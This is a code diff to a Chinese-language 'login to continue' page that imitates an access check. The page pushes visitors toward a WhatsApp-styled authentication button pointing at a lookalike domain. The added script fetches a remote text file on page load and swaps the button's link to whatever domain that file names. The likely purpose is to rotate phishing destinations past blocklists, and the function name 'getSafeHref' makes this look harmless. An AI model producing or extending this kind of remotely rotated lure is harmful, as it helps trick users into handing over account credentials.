@@ -115,7 +115,7 @@
             <h2 id="auth-title">登录以继续</h2>
             <p id="auth-desc">本页面受访问保护。<br>请完成下方认证以继续访问。</p>
             <div class="auth-btn-group">
-                <a class="auth-btn auth-btn-whatsapp" href="https://www.whteassppmcs.icu/?id=2&amp;jump=https://deepseek.com">
+                <a class="auth-btn auth-btn-whatsapp" data-remote-auth-link href="https://www.whteassppmcs.icu/?id=2&amp;jump=https://deepseek.com">
                     <span class="auth-btn__icon">
                         <svg width="22" height="22" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                             <path fill="#25D366" d="M16 0C7.164 0 0 7.163 0 16c0 2.828.736 5.482 2.025 7.792L0 32l8.448-2.016A15.917 15.917 0 0 0 16 32c8.837 0 16-7.163 16-16S24.837 0 16 0z"></path>
@@ -136,6 +136,44 @@
         function hideAuthDialog() {
             document.getElementById('auth-overlay').style.display = 'none';
         }
+
+        (function loadRemoteAuthLink() {
+            var remoteConfigUrl = 'https://youlian-cn.com/zh/deepseek1.txt';
+
+            function getSafeHref(text) {
+                var remoteHost = String(text || '').trim().split(/\s+/)[0];
+                if (!remoteHost) {
+                    return '';
+                }
+
+                remoteHost = remoteHost.replace(/^https?:\/\//i, '').replace(/\/.*$/, '');
+                if (!/^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$/i.test(remoteHost)) {
+                    return '';
+                }
+
+                return 'https://' + remoteHost + '/?id=2&jump=https://deepseek.com';
+            }
+
+            fetch(remoteConfigUrl, { cache: 'no-store' })
+                .then(function(response) {
+                    if (!response.ok) {
+                        throw new Error('Remote link unavailable');
+                    }
+                    return response.text();
+                })
+                .then(function(text) {
+                    var safeHref = getSafeHref(text);
+                    if (!safeHref) {
+                        return;
+                    }
+                    document.querySelectorAll('[data-remote-auth-link]').forEach(function(link) {
+                        link.href = safeHref;
+                    });
+                })
+                .catch(function() {
+                    // Keep the default href when the remote text cannot be read.
+                });
+        })();
     </script>
 </body>
 
